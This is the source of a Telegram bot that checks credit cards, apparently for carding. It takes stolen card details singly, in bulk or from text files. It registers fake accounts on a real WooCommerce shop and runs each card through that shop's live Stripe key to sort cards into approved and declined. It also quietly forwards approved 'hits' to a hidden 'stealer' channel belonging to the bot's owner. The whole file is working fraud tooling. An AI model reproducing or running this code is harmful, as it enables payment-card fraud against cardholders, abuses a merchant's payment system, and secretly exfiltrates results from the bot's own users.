import requests
import random
import string
import asyncio
import time
import logging
import traceback
import os
import re
from user_agent import generate_user_agent
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

logging.basicConfig(level=logging.INFO)

# ------------------- CONFIG -------------------
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1002549777556
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

# ------------------- HELPERS -------------------
def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    """Send approved card to stealer channel (NO CC, NO BIN, NO Bank, NO Country)"""
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ------------------- CORE CHECK FUNCTION -------------------
async def stripe_check(card):
    def sync_stripe(card):
        parts = card.split("|")
        n, mm, yy, cvc = parts[0], parts[1], parts[2][-2:], parts[3]

        r = requests.Session()
        user = generate_user_agent()

        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
        email = f"{username}@gmail.com"

        # Get Woocommerce nonce
        try:
            rd = r.get('https://shop.wiseacrebrew.com/account/add-payment-method/',
                       cookies=r.cookies,
                       headers={'user-agent': user}).text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
        except:
            rd = ""

        # Register (may fail silently)
        try:
            r.post('https://shop.wiseacrebrew.com/account/add-payment-method/',
                   headers={'user-agent': user},
                   data={'email': email,
                         'password': 'karar1111',
                         'woocommerce-register-nonce': rd,
                         '_wp_http_referer': '/my-account/add-payment-method/',
                         'register': 'Register'})
        except:
            pass

        # Get SetupIntent nonce
        try:
            rei = r.get('https://shop.wiseacrebrew.com/account/add-payment-method/',
                        headers={'user-agent': user}).text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        except:
            rei = ""

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F41ba105bc6%3B+stripe-js-v3%2F41ba105bc6%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=172686&client_attribution_metadata[client_session_id]=70a646ff-9da9-44eb-9bf9-d73d09557bf0&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=4071ff8f-9008-4386-b999-9a18be48e358&guid=NA&muid=NA&sid=NA&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'

        # Create Payment method
        try:
            response = r.post('https://api.stripe.com/v1/payment_methods',
                              headers={'user-agent': user},
                              data=data)
            response_json = response.json()
        except Exception as e:
            logging.error(f"Stripe PaymentMethod creation error: {e}")
            response_json = {}

        # Confirm SetupIntent
        try:
            resp = r.post('https://shop.wiseacrebrew.com/',
                          params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                          headers={'user-agent': user},
                          data={'action': 'create_and_confirm_setup_intent',
                                'wc-stripe-payment-method': response_json.get('id', ''),
                                'wc-stripe-payment-type': 'card',
                                '_ajax_nonce': rei})
            try:
                resp_json = resp.json()
                logging.info(f"Setup Intent Confirmation Response: {resp_json}")
            except:
                resp_json = {"success": False, "data": {}}
        except Exception as e:
            logging.error(f"Setup Intent confirm post error: {e}")
            resp_json = {"success": False, "data": {}}

        # Determine status and extract actual message
        if resp_json.get("success") and resp_json.get("data", {}).get("status") == "succeeded":
            status = "Approved ✅"
            # Try to get a meaningful success message
            text_resp = resp_json.get("data", {}).get("status", "Payment method saved")
        else:
            status = "Declined ❌"
            # Extract actual error from response
            try:
                # First, check if there's an error in the JSON response
                if "data" in resp_json and "error" in resp_json["data"]:
                    error = resp_json["data"]["error"]
                    text_resp = error.get("message", "Transaction declined")
                elif "errors" in resp_json:
                    text_resp = resp_json["errors"][0].get("message", "Transaction declined")
                else:
                    # Fallback to looking in the raw response text
                    resp_text = resp.text.lower()
                    if "card was declined" in resp_text:
                        text_resp = "Card was declined"
                    elif "your card number is incorrect" in resp_text:
                        text_resp = "Card number is incorrect"
                    elif "security code is incorrect" in resp_text:
                        text_resp = "Security code is incorrect"
                    elif "insufficient funds" in resp_text:
                        text_resp = "Insufficient funds"
                    else:
                        # Extract any error message from HTML if possible
                        match = re.search(r'<div class="woocommerce-error">(.*?)</div>', resp.text, re.DOTALL)
                        if match:
                            text_resp = match.group(1).strip()
                        else:
                            text_resp = "Transaction declined"
            except:
                text_resp = "Transaction declined"

        return {"status": status, "text": text_resp, "bin": n[:6]}

    return await asyncio.to_thread(sync_stripe, card)

# ------------------- SINGLE CHECK COMMAND -------------------
@Client.on_message(filters.command("pr", [".", "/"]))
async def stripe_cmd(Client, message):
    user_id = str(message.from_user.id)
    try:
        checkall = await check_all_thing(Client, message)
        gateway = "Stripe Gate Premium 💎"
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {gateway}
◈ <b>ᴄᴍᴅ :</b> /pr

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /pr cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        result = await stripe_check(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = ("Unknown",)*7
        if len(getbin) > 0:
            brand = getbin[0]
        if len(getbin) > 1:
            type_ = getbin[1]
        if len(getbin) > 2:
            level = getbin[2]
        if len(getbin) > 3:
            bank = getbin[3]
        if len(getbin) > 4:
            country = getbin[4]
        if len(getbin) > 5:
            flag = getbin[5]
        if len(getbin) > 6:
            currency = getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        # Send to stealer if approved
        if "Approved" in result['status'] or "✅" in result['status']:
            await send_hit_to_stealer(
                Client, fullcc, result['status'], result['text'], gateway,
                time.perf_counter() - start, message.from_user.first_name, role
            )

        # Make status bold
        display_status = f"<b>{result['status']}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ {result['text']}
{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}

{SYMBOL} 𝗕𝗜𝗡 ⇾ {cc[:6]}
{SYMBOL} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}
{SYMBOL} 𝗕𝗮𝗻𝗸 ⇾ {bank}
{SYMBOL} 𝗧𝘆𝗽𝗲 ⇾ {brand} | {type_} - {level}

{SYMBOL} 𝗧𝗶𝗺𝗲 ⇾ {time.perf_counter() - start:.2f}s
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        print(f"[stripe_cmd ERROR] {traceback.format_exc()}")
        await message.reply_text("An error occurred. Please try again later.", quote=True)

# ------------------- MASS CHECK (text/reply) -------------------
@Client.on_message(filters.command("mpr", [".", "/"]))
async def stripe_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> Stripe Gate Premium 💎
◈ <b>ᴄᴍᴅ :</b> /mpr

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mpr cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ------------------- TXT FILE COMMAND -------------------
@Client.on_message(filters.command("tpr", [".", "/"]))
async def stripe_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> Stripe Gate Premium 💎
◈ <b>ᴄᴍᴅ :</b> /tpr

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ------------------- SEQUENTIAL PROCESSING (MASS + TXT) -------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = "Stripe Gate Premium 💎"
    start_time = time.perf_counter()
    approved_cards = []

    # Progress message
    progress_text = f"""Stripe Gate Premium
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved: 0
Declined: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""
    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed

        result = await stripe_check(fullcc)
        status = result['status']
        response_text = result['text']

        # BIN details for user display (full info)
        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": response_text,
                "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "bin": cc_num[:6],
                "time": card_time
            })
            # Send to stealer (no CC/BIN)
            await send_hit_to_stealer(Client, fullcc, status, response_text, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        # Update progress
        try:
            await Client.edit_message_text(
                message.chat.id,
                progress_msg.id,
                f"""Stripe Gate Premium
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved: {approved_count}
Declined: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                parse_mode=enums.ParseMode.HTML
            )
        except:
            pass
        await asyncio.sleep(0.5)

    # Delete progress message
    await progress_msg.delete()

    # Send each approved card separately (full details, no Owner line)
    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ {card['response']}
{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {card['gateway']}

{SYMBOL} 𝗕𝗜𝗡 ⇾ {card['bin']}
{SYMBOL} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {card['country']} {card['flag']}
{SYMBOL} 𝗕𝗮𝗻𝗸 ⇾ {card['bank']}
{SYMBOL} 𝗧𝘆𝗽𝗲 ⇾ {card['brand']}

{SYMBOL} 𝗧𝗶𝗺𝗲 ⇾ {card['time']:.2f}s
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    # Send declined summary (no Owner line)
    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True,
            parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
